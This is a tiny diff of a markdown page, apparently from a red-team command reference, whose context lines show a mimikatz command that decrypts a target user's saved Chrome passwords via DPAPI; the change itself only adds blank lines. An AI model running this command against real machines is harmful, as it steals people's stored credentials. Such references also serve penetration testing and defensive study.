@@ -15,3 +15,5 @@ updated_at: '2023-03-14T01:11:04.243252+00:00'
 ```bash
 mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect"
 ```
+
+
